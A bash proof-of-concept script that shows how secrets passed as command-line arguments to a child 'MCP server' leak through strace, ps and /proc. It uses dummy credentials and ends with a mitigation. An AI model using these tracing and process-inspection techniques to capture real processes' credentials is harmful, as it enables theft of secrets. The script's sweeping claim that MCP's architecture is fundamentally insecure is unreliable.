#!/bin/bash
# Linux demonstration of parent-child YAMA bypass
# Shows how credentials are exposed when launching MCP servers

echo "=== Parent-Child YAMA Bypass Demo (Linux) ==="
echo

# Check YAMA setting
echo "[*] Checking YAMA ptrace_scope setting..."
if [ -f /proc/sys/kernel/yama/ptrace_scope ]; then
    YAMA_SETTING=$(cat /proc/sys/kernel/yama/ptrace_scope)
    echo "[*] YAMA ptrace_scope = $YAMA_SETTING"
    case $YAMA_SETTING in
        0) echo "    - Classic mode: Any process can trace" ;;
        1) echo "    - Parent-child only (Ubuntu default)" ;;
        2) echo "    - Admin only" ;;
        3) echo "    - No attach" ;;
    esac
else
    echo "[!] YAMA not available on this system"
fi
echo

# Demonstrate the vulnerability
echo "[*] Demonstrating credential exposure via parent-child tracing..."
echo "[*] This simulates how MCP servers receive database credentials"
echo

# Method 1: Direct strace launch (parent-child bypass)
echo "=== Method 1: Direct Launch Under strace ==="
echo "[*] Launching server with credentials in command line..."
echo "[*] Command: strace -e trace=execve,read,write python3 echo-server.py 'user:SuperSecret123@db.internal:5432/production'"
echo

# Create a test message
TEST_MSG='{"jsonrpc":"2.0","method":"query","params":{"sql":"SELECT * FROM users"},"id":1}'

# Launch under strace and capture output
timeout 5s bash -c "
    echo '$TEST_MSG' | strace -e trace=execve,read,write -s 200 python3 echo-server.py 'user:SuperSecret123@db.internal:5432/production' 2>&1
" | grep -E "(execve|read|write|SuperSecret|production)" | head -20

echo
echo "[!] Notice: The credentials 'user:SuperSecret123@db.internal:5432/production' are visible!"
echo

# Method 2: Process argument inspection
echo "=== Method 2: Process Argument Inspection ==="
echo "[*] Even without strace, credentials in command line are visible..."
echo

# Launch in background
python3 echo-server.py 'apikey:sk-proj-VerySecretAPIKey123' > /dev/null 2>&1 &
SERVER_PID=$!
sleep 0.5

# Show process arguments
echo "[*] Using ps to see process arguments:"
ps aux | grep -E "echo-server.*apikey" | grep -v grep

# Show /proc exposure
echo
echo "[*] Using /proc filesystem:"
if [ -f /proc/$SERVER_PID/cmdline ]; then
    echo -n "    cmdline: "
    tr '\0' ' ' < /proc/$SERVER_PID/cmdline
    echo
fi

# Cleanup
kill $SERVER_PID 2>/dev/null
wait $SERVER_PID 2>/dev/null

echo
echo "=== Summary ==="
echo "[!] Credentials passed via command line arguments are exposed to:"
echo "    - Parent processes (bypassing YAMA restrictions)"
echo "    - Any process with same UID (via /proc filesystem)"
echo "    - Process listing tools (ps, top, htop)"
echo "    - System logs and audit trails"
echo
echo "[*] This is why MCP's architecture is fundamentally insecure:"
echo "    - Database credentials are passed via command line"
echo "    - API keys are visible in process listings"
echo "    - No encryption of sensitive data"
echo "    - Parent-child trust model is easily exploited"
echo
echo "[*] Mitigation: Never pass secrets via command line or environment!"